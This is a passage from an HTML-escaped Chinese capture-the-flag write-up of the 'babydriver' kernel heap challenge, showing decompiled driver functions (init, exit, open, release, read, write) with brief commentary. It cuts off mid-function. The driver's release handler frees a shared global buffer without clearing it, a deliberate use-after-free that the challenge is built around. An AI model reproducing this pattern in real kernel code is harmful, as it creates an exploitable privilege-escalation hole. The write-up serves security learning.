class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&#34;题目分析&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#题目分析&#34;&gt;#&lt;/a&gt; 题目分析&lt;/h2&gt;
&lt;p&gt;这是一道堆题&lt;/p&gt;
&lt;h3 id=&#34;init&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#init&#34;&gt;#&lt;/a&gt; init&lt;/h3&gt;
&lt;p&gt;我们 open 设备的时候，会默认调用这个函数，这里初始化了一些参数&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; __cdecl &lt;span class=&#34;title function_&#34;&gt;babydriver_init&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __int64 v0; &lt;span class=&#34;comment&#34;&gt;// rdx&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; v1; &lt;span class=&#34;comment&#34;&gt;// edx&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __int64 v2; &lt;span class=&#34;comment&#34;&gt;// rsi&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __int64 v3; &lt;span class=&#34;comment&#34;&gt;// rdx&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; v4; &lt;span class=&#34;comment&#34;&gt;// ebx&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; *&lt;span class=&#34;title&#34;&gt;v5&lt;/span&gt;;&lt;/span&gt; &lt;span class=&#34;comment&#34;&gt;// rax&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __int64 v6; &lt;span class=&#34;comment&#34;&gt;// rdx&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __int64 v7; &lt;span class=&#34;comment&#34;&gt;// rax&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( (&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt;)alloc_chrdev_region(&amp;amp;babydev_no, &lt;span class=&#34;number&#34;&gt;0LL&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;1LL&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;babydev&amp;quot;&lt;/span&gt;) &amp;gt;= &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    cdev_init(&amp;amp;cdev_0, &amp;amp;fops);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    v2 = babydev_no;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    cdev_0.owner = &amp;amp;_this_module;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    v4 = cdev_add(&amp;amp;cdev_0, babydev_no, &lt;span class=&#34;number&#34;&gt;1LL&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( v4 &amp;gt;= &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      v5 = (class *)_class_create(&amp;amp;_this_module, &lt;span class=&#34;string&#34;&gt;&amp;quot;babydev&amp;quot;&lt;/span&gt;, &amp;amp;babydev_no);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      babydev_class = v5;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( v5 )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        v7 = device_create(v5, &lt;span class=&#34;number&#34;&gt;0LL&lt;/span&gt;, babydev_no, &lt;span class=&#34;number&#34;&gt;0LL&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;babydev&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        v1 = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( v7 )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; v1;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        printk(&amp;amp;unk_351, &lt;span class=&#34;number&#34;&gt;0LL&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0LL&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        class_destroy(babydev_class);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        printk(&amp;amp;unk_33B, &lt;span class=&#34;string&#34;&gt;&amp;quot;babydev&amp;quot;&lt;/span&gt;, v6);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      cdev_del(&amp;amp;cdev_0);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      printk(&amp;amp;unk_327, v2, v3);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    unregister_chrdev_region(babydev_no, &lt;span class=&#34;number&#34;&gt;1LL&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; v4;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  printk(&amp;amp;unk_309, &lt;span class=&#34;number&#34;&gt;0LL&lt;/span&gt;, v0);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;exit&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#exit&#34;&gt;#&lt;/a&gt; exit&lt;/h3&gt;
&lt;p&gt;同理，我们关闭设备的后会调用这个函数&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; __cdecl &lt;span class=&#34;title function_&#34;&gt;babydriver_exit&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  device_destroy(babydev_class, babydev_no);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  class_destroy(babydev_class);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  cdev_del(&amp;amp;cdev_0);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  unregister_chrdev_region(babydev_no, &lt;span class=&#34;number&#34;&gt;1LL&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;babyopen&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#babyopen&#34;&gt;#&lt;/a&gt; babyopen&lt;/h3&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; __fastcall &lt;span class=&#34;title function_&#34;&gt;babyopen&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(inode *inode, file *filp)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __int64 v2; &lt;span class=&#34;comment&#34;&gt;// rdx&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  _fentry__(inode, filp);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  babydev_struct.device_buf = (&lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *)kmem_cache_alloc_trace(kmalloc_caches[&lt;span class=&#34;number&#34;&gt;6&lt;/span&gt;], &lt;span class=&#34;number&#34;&gt;37748928LL&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;64LL&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  babydev_struct.device_buf_len = &lt;span class=&#34;number&#34;&gt;64LL&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  printk(&lt;span class=&#34;string&#34;&gt;&amp;quot;device open\n&amp;quot;&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;37748928LL&lt;/span&gt;, v2);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;申请了一个 buf 空间，大小为 0x40&lt;/p&gt;
&lt;h3 id=&#34;babyrelease&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#babyrelease&#34;&gt;#&lt;/a&gt; babyrelease&lt;/h3&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; __fastcall &lt;span class=&#34;title function_&#34;&gt;babyrelease&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(inode *inode, file *filp)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __int64 v2; &lt;span class=&#34;comment&#34;&gt;// rdx&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  _fentry__(inode, filp);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  kfree(babydev_struct.device_buf);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  printk(&lt;span class=&#34;string&#34;&gt;&amp;quot;device release\n&amp;quot;&lt;/span&gt;, filp, v2);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;babyread&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#babyread&#34;&gt;#&lt;/a&gt; babyread&lt;/h3&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;ssize_t&lt;/span&gt; __fastcall &lt;span class=&#34;title function_&#34;&gt;babyread&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(file *filp, &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *buffer, &lt;span class=&#34;type&#34;&gt;size_t&lt;/span&gt; length, &lt;span class=&#34;type&#34;&gt;loff_t&lt;/span&gt; *offset)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;size_t&lt;/span&gt; v4; &lt;span class=&#34;comment&#34;&gt;// rdx&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;ssize_t&lt;/span&gt; result; &lt;span class=&#34;comment&#34;&gt;// rax&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;ssize_t&lt;/span&gt; v6; &lt;span class=&#34;comment&#34;&gt;// rbx&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  _fentry__(filp, buffer);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( !babydev_struct.device_buf )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;-1LL&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  result = &lt;span class=&#34;number&#34;&gt;-2LL&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( babydev_struct.device_buf_len &amp;gt; v4 )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    v6 = v4;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    copy_to_user(buffer);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    result = v6;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; result;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;babywrite&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#babywrite&#34;&gt;#&lt;/a&gt; babywrite&lt;/h3&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;ssize_t&lt;/span&gt; __fastcall &lt;span class=&#34;title function_&#34;&gt;babywrite&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(file *filp, &lt;span class=&#34;type&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *buffer, &lt;span class=&#34;type&#34;&gt;size_t&lt;/span&gt; length, &lt;span class=&#34;type&#34;&gt;loff_t&lt;/span&gt; *offset)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;size_t&lt;/span&gt; v4; &lt;span class=&#34;comment&#34;&gt;// rdx&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;ssize_t&lt;/span&gt; result; &lt;span class=&#34;comment&#34;&gt;// rax&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;ssize_t&lt;/span&gt; v6; &lt;span class=&#34;comment&#34;&gt;// rbx&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  _fentry__(filp, buffer);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( !babydev_struct.device_buf )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;-1LL&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  result = &lt;span class=&#34;number&#34;&gt;-2LL&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( babydev_struct.device_buf_len &amp;gt; v4 )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    v6 = v4;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    copy_from_user();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    result = v6;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  